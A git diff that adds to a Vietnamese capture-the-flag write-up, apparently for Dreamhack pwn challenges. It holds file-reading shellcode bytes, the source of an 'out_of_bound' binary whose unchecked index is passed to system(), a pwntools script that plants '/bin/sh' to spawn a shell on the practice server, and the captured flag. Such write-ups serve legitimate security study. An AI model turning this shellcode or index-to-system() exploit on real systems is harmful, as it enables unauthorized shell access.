@@ -85,7 +85,7 @@ Ta cần setup các thanh ghi:
 ```
 
 sau đó ta dùng tool [link](https://defuse.ca/) để đổi asm thành mã máy
-```\x6a\x00\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6E\x67\x50\x48\xB8\x61\x6D\x65\x5F\x69\x73\x5F\x6C\x50\x48\xB8\x63\x2F\x66\x6C\x61\x67\x5F\x6E\x50\x48\xB8\x65\x6C\x6C\x5F\x62\x61\x73\x69\x50\x48\xB8\x2F\x68\x6F\x6D\x65\x2F\x73\x68\x50\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05\x48\x89\xC7\x48\x89\xE6\x48\x83\xEE\x30\x48\xC7\xC2\x30\x00\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x0F\x05```
+`\x6a\x00\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6E\x67\x50\x48\xB8\x61\x6D\x65\x5F\x69\x73\x5F\x6C\x50\x48\xB8\x63\x2F\x66\x6C\x61\x67\x5F\x6E\x50\x48\xB8\x65\x6C\x6C\x5F\x62\x61\x73\x69\x50\x48\xB8\x2F\x68\x6F\x6D\x65\x2F\x73\x68\x50\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05\x48\x89\xC7\x48\x89\xE6\x48\x83\xEE\x30\x48\xC7\xC2\x30\x00\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x0F\x05`
 
 <details> <summary> script asm </summary>
 
@@ -120,6 +120,138 @@ sau đó ta dùng tool [link](https://defuse.ca/) để đổi asm thành mã m�
     mov rax, 0x1
     mov rdi, 1      ; fd = stdout
     syscall
+```
+
+</details>
+
+# out_of_bound
+
+## source
+
+<details> <summary> source C </summary>
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+#include <string.h>
+
+char name[16];
+
+char \*command[10] = { "cat",
+"ls",
+"id",
+"ps",
+"file ./oob" };
+void alarm_handler()
+{
+puts("TIME OUT");
+exit(-1);
+}
+
+void initialize()
+{
+setvbuf(stdin, NULL, \_IONBF, 0);
+setvbuf(stdout, NULL, \_IONBF, 0);
+
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+
+}
+
+int main()
+{
+int idx;
+
+    initialize();
+
+    printf("Admin name: ");
+    read(0, name, sizeof(name));
+    printf("What do you want?: ");
+
+    scanf("%d", &idx);
+
+    system(command[idx]);
+
+    return 0;
+
+}
+```
+
+</details>
+
+## Ý tưởng
+
+- Ở đây, ta chú ý đoạn code này, ở đây chúng ta nhận `idx` là 0, 1, 2 để thông qua system thực hiện các lệnh ls, id, ...
+- Tuy vậy ta hoàn toàn có thể truy cập các giá trị ngoài mảng `command`
+
+```c
+    char \*command[10] = { "cat",
+    "ls",
+    "id",
+    "ps",
+    "file ./oob" };
+
+    scanf("%d", &idx);
+
+    system(command[idx]);
+```
+
+- Thông qua ida ta kiểm được địa chỉ mảng `command` và mảng `name`, và khi trừ thì ta thấy mảng `command` được khai báo trước mảng `name`
+
+```
+>>> name = 0x804A0AC
+>>> command = 0x804A060
+```
+
+- Đến đây, ta có thể đoán được ta sẽ truyền chuỗi `/bin/sh` vào `name`, sau đó ta nhập vào giá trị `idx` tại chuỗi `/bin/sh`
+
+## Thực thi
+
+- Đầu tiên ta sẽ tìm giá trị `idx`
+
+```
+>>> name - command
+76
+>>> 76/4
+19.0
+```
+
+- Vậy tại vị trí `command[19]` ta sẽ truyền vào chuỗi `/bin/sh` vào main và chạy thử, và lỗi =))
+
+```
+Admin name: /bin/sh
+What do you want?: 19
+```
+
+- Ta thử gdb và dừng ngay hàm system
+
+![image](https://user-images.githubusercontent.com/111769169/227205825-b4c943fb-7028-43a2-9bdd-1d9657a7d41a.png)
+
+- Ở đây system chỉ thực hiện chuỗi `/bin`, để chắc chắc ta sẽ kiểm tra ida và kết quả là: `system((&command)[v4[0]]);`
+
+- Vậy ta sẽ truyền `v4[0]` là địa chỉ của chuỗi `/bin/sh`,để khi thực hiện system, chương trình lấy chuỗi `/bin/sh`
+
+- Do file 32bit mà cuỗi `/bin/sh` có 7 byte nên em thêm byte null vào cuối chuỗi tránh bị lỗi, nối chuỗi /bin/sh vào các chuỗi khác
+<details> <summary> script </summary>
+
+```python
+from pwn import *
+
+from pwn import *
+
+exe = ELF("./out_of_bound")
+# r = process(exe.path)
+r = remote("host3.dreamhack.games", 18672)
+name = 0x804A0AC + 4
+payload = p32(name) + b"/bin/sh\0"
+
+r.sendlineafter(b"name: ", payload)
+r.sendlineafter(b"want?: ", b"19")
+
+r.interactive()
+# DH{2524e20ddeee45f11c8eb91804d57296}
 ```
 
 </details>
